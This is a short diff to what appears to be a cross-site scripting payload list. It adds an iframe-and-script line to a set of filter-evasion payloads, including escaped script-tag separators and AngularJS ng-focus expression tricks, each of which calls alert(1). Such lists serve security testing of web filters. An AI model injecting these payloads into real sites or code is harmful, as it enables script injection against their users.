@@ -6,6 +6,7 @@
 <script\x2Ftype="text/javascript">javascript:alert(1);</script>
 <script\x0Atype="text/javascript">javascript:alert(1);</script>
 <input id=x ng-focus=$event.path|orderBy:'CSS&&[1].map(alert)'> 
+<iframe id=element></iframe><script>element.alert(1)</script>
 <input id=x ng-focus=$event.path|orderBy:'x&&[1].map(alert)'> 
 <input id=x ng-focus=$event.path|orderBy:'x&&[alert].pop()(1)'>
 <input id=x ng-focus=$event.path|orderBy:'[alert].pop()(1)'>
